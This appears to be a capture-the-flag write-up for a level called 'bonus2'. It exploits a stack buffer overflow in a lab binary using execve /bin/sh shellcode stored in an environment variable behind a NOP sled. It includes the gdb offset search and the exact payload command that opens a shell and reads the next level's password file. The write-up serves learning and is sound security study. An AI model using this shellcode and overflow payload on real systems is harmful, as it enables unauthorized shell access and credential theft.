# Bonus 2

We're again using this [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html) that we insert in the env after a nope slide, we'll increment the pointer to it a bit to make our exploit more resilient, refer to `bonus0` for more.

```shell
export PWN=$(python -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
export LANG=nl
```

```shell
(gdb) r `python -c 'print 41 * "A"'` "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
0x38614137 in ?? ()

(gdb) p (void*)getenv("PWN")
$1 = (void *) 0xbffffd2c
```
Using [a pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) we found that the offset it segfaults at is 23.

```shell
./bonus2 `python -c 'print 40 * "A"'` `python -c 'print 23 * "B" + "\x6c\xfd\xff\xbf"'`
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBl���a
$ cat /home/user/bonus3/.pass
[redacted]
```

```shell
$ ./a.out
sizeof("Hyvää päivää ") = 19
sizeof("Goedemiddag! ") = 14
sizeof("Hello ") = 6;
```

You can do it too with LANG=fi, but you need 5 fewer bytes of padding, because the Finnish greeting is 5 chars longer (Unicode).
You can't do it with LANG=en, because it's not long enough. When I try to repeat the steps, with the generated pattern, it doesn't find the right offset.
